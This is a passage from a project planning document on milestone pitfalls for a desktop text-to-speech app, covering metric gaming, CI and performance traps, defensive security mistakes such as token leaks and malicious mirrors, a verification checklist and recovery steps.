- **Don't close issues just-in-time:** if there's no test or repro added, the issue gets reopened by triage. Force the "we actually fixed it" verification.
- **Anti-feature decisions need labels** (`won't-do`, `out-of-scope-this-milestone`) and a kind decline message — they shouldn't be just-closed.
- **Public scoreboard** — write the metrics into the milestone retrospective doc upfront so they're hard to massage post-hoc.
- **Watch for the "11/11 closed" announcement temptation** — if the headline is the number, you've optimized for the number. Bury it; lead with "first-run install success on three OSes" or "Discord help volume down X%."

**Warning signs:**
- A PR that closes an issue with "see also #N" where #N is open and unowned.
- Issue close rate > Issue open rate consistently — sounds good, may mean issues are being closed by autoresponder.
- Discord volume not dropping while the inbox metric is being met.
- A close message that doesn't include "verified by [user] on [date]."

**Phase to address:** **Cross-cutting — embed in milestone retrospective process.** Set the second metric (net inbox) at milestone start, not at the end when you'll be tempted to pick favorable framing.

**Severity:** **degrades-quality** of the project's relationship with users — the milestone "succeeds" by metric but users are still stuck.

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Skip macOS/Windows runtime CI to save runner minutes | ~10 min faster PR turnaround | Platform regressions caught only by users (the central failure mode of the milestone) | Never in a stabilization milestone |

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| GitHub Issues API (auto bug reporter) | Use a single shared GitHub PAT in the app binary | Use a GitHub App or OAuth flow; never embed any token in the binary. Anonymous users open issues via the unauthenticated REST API with strict client-side rate limiting. |
| Hugging Face Hub | Pass `token=` kwarg as positional, leaks into tracebacks | Always use env var (`HF_TOKEN`) or `huggingface_hub.login()`; never construct URLs with token inline |

| AudioSeal watermark | Apply silently without surfacing in UI | Already done; verify the bug reporter doesn't strip watermark-detection logs (users may need them to prove provenance) |
| MLX-Audio on non-macOS | Loads conditionally; missing condition crashes everywhere | Existing pattern — `is_available()` returns false on non-macOS; verify Supertonic-3 follows the same pattern |

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Synchronous model download on first synthesize | App "hangs" for 5-30 min | Background download with cancellable progress in Settings → Models | First launch — every new user hits it |
| Loading all 7 TTS engines into memory at startup | Slow boot, high RAM idle | Lazy-load engine modules on first use; `is_available()` should be cheap (check disk only, not import) | Boot time on Windows already takes 5-10 min per README — every added engine extends this |

| Vitest + node:test running on all 3 OSes serially | Linear CI time | Already parallel via matrix; verify `fail-fast: false` so one platform's failure doesn't kill others | Already in `ci.yml`; verify Supertonic-3 PR doesn't accidentally serialize them |
| Bug reporter does network I/O on the main thread | UI freezes when reporting | Reporter runs on a background thread; UI shows "Sending..." spinner | Any time user hits Report; failure mode is worst when they're already frustrated by the original bug |
| AppImage software rendering for everyone | UI lags on all Linux users | Conditional NVIDIA detection (Pitfall 9) | Every Linux launch when blanket-set |

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Bug reporter sends `os.environ` (or any subset) by default | HF token, AWS creds, GitHub tokens leak to public GitHub issue | Default-deny payload; explicit allow-list per Pitfall 3 |
| User-selectable PyPI mirror URL as freeform text | Malicious mirror serves backdoored `pyannote` / `whisperx` | Allow-list dropdown; hash-pinned `uv.lock` (Pitfall 6) |
| `xattr -cr` documented without SHA-256 verification context | Phishing: user runs `xattr -cr` on malware after being trained to (Pitfall 8) | Publish + document checksum verification before bypass |
| HF token in shell rc file with world-readable perms | Local privilege escalation reads token | Document `chmod 600 ~/.zshrc` in setup guide; prefer keychain storage |
| Auto bug reporter without a recursion guard | Crash storm DDoS's GitHub from many client IPs (Pitfall 4) | Thread-local recursion guard + per-day cap + dedup |
| Supertonic-3 model card non-commercial license bundled without disclosure | Users redistribute the OmniVoice DMG including a non-redistributable model | Verify license; if restrictive, opt-in install only with disclosure |
| Settings → Logs UI shows un-redacted token in `pyannote` 401 lines | User screenshots logs to Discord; token leaks (Pitfall 5) | Centralized log redaction at logger filter level |
| Frontend includes the bug-reporter's full payload-preview in DOM | Browser dev-tools console captures redacted-token before redaction filter runs | Redact before render, not at the network boundary |
| The "From source" install instructions don't warn about `gh auth login` exposing PATs in shell history | Power users who set up `gh` for the auto-reporter end up with PATs in history | Document `HISTCONTROL=ignorespace` pattern; prefer OAuth flow over PAT |
| Tauri updater accepts non-signed manifests when signing key is missing locally | Compromised GitHub release replaces `latest.json` with malicious updater payload | Signing already enforced via `TAURI_SIGNING_PRIVATE_KEY`; verify production builds fail if missing rather than silently disable |

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|

## "Looks Done But Isn't" Checklist

- [ ] **Install tutorial for Linux:** Often missing distro-specific package commands — verify `dnf`, `apt`, `zypper`, `pacman` all present.
- [ ] **`xattr -cr` workaround:** Often missing SHA-256 verification step — verify checksum is in the release body AND linked from the workaround.
- [ ] **AppImage workaround:** Often missing NVIDIA detection — verify the launcher wrapper conditionally sets the env var.
- [ ] **HF token setup guide:** Often missing PowerShell instructions and zsh-vs-bash split — verify both `~/.zshrc` and `~/.bashrc` and `setx` AND PowerShell methods documented.
- [ ] **HF token expiry detection:** Often missing — verify a startup whoami check fails-loud when token is invalid.
- [ ] **Auto bug reporter redaction:** Often missing test fixtures — verify there's a `tests/test_bug_reporter_redaction.py` with at least 10 token/path/env patterns.
- [ ] **Auto bug reporter recursion guard:** Often missing — verify a test that simulates the reporter itself throwing during submission and confirms only 1 issue is filed.
- [ ] **Auto bug reporter dedup:** Often missing — verify same error 5 times in a row produces 1 issue, not 5.
- [ ] **Auto bug reporter rate limit:** Often missing — verify >3 reports/day from same install hits a clear "limit reached" UX, not a silent drop.
- [ ] **Supertonic-3 license:** Often missing — verify the model card LICENSE has been read and surfaced in `display_name` if restrictive.
- [ ] **Supertonic-3 dep isolation:** Often missing — verify `pyproject.toml` puts it in `[optional-dependencies]`, not main.
- [ ] **Supertonic-3 model revision pin:** Often missing — verify the engine code pins a specific HF commit SHA, not `main`.
- [ ] **Mirror fallback hash verification:** Often missing — verify `uv sync --frozen` is used and tested with the mirror config active.
- [ ] **Mirror fallback UI:** Often missing — verify it's an allow-list dropdown, not a freeform text input.
- [ ] **Cross-platform CI runtime tests:** Often missing — verify `ci.yml` has steps that run Python imports on macOS and Windows, not just `cargo check`.
- [ ] **Pre-milestone `omnivoice_data/` fixture:** Often missing — verify a sample user-state fixture exists and is loaded by a smoke test.
- [ ] **Release SHA-256 checksums:** Often missing — verify `release.yml` publishes per-artifact SHA-256 in the release body.
- [ ] **"Tested on" date stamp in install docs:** Often missing — verify each platform doc has a "last validated YYYY-MM-DD" line.
- [ ] **Tauri updater signature check:** Often missing the "fails closed" guarantee — verify a build without the signing key fails to bundle (not silently disables).
- [ ] **Two-RC cadence per wave:** Often missing — verify each wave ships as `-rc1`, sits 48h, then promotes.

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Fix-regression cycle (Pitfall 1) | MEDIUM | Tag a hotfix `v0.3.x+1` reverting just the offending commit; do NOT roll back the whole wave. Add a regression test for the specific user's repro to prevent re-occurrence. |
| Install docs broken on a platform (Pitfall 2) | LOW | Edit docs in main, no release needed; pin the corrected docs URL in Discord. Add a check-doc-freshness CI job for the future. |
| PII leaked in auto-filed GitHub issue (Pitfall 3) | HIGH | (1) Edit the issue immediately to redact (GitHub edit-history is visible — also delete the issue if a real secret). (2) Revoke the leaked secret (force user to rotate HF token). (3) Notify the user privately. (4) Patch the reporter and ship within 24h. (5) Mark the milestone's auto-reporter feature `disabled` in shipped versions until patch lands. |
| Bug-reporter DDoS / spam storm (Pitfall 4) | HIGH | (1) Ship a kill-switch via Tauri's remote config or `latest.json` field that disables the reporter for all clients. (2) Mass-label inbox auto-reports with `dup` and close. (3) Patch the loop and re-enable. |
| HF token leak in shipped logs (Pitfall 5) | HIGH | (1) User must rotate token immediately. (2) Patch logger redaction. (3) Ship hotfix within 48h. (4) Audit historical logs in shipped versions — direct users to clear `omnivoice_data/logs/*` and rotate. |
| Malicious mirror compromise (Pitfall 6) | CRITICAL | (1) Push an emergency `v0.3.x+1` with the malicious mirror removed from allow-list. (2) Notify users via in-app banner + GitHub Security Advisory. (3) Document remediation: full venv rebuild, audit for backdoors, rotate all credentials. (4) If feasible, ship a scanner that detects the malicious package signature in the user's venv. |
| Supertonic-3 breaks existing engines (Pitfall 7) | MEDIUM | Hotfix to mark Supertonic-3 unavailable; `pyproject.toml` `[optional-dependencies]` keeps existing users safe. Per-engine venv isolation considered for v0.4. |
| `xattr -cr` exploited via fake docs (Pitfall 8) | MEDIUM | (1) GitHub Security Advisory with hash mismatch detection. (2) Publish detection script for users to verify their install hasn't been tampered. (3) Accelerate the real-signing milestone. |
| AppImage perf regression after blanket workaround (Pitfall 9) | LOW | Update the AppImage launcher in next release with conditional NVIDIA detection. Document the user-side env-var unset workaround for the interim. |
| Cross-platform regression shipped (Pitfall 10) | MEDIUM | Same as fix-regression cycle; in addition, add the missing OS to CI so the regression class is permanently caught. |
| Empty-inbox metric distortion (Pitfall 11) | LOW | At milestone retrospective: publish both metrics (closed count AND net inbox change AND Discord volume delta). Be public about which moved and which didn't. |
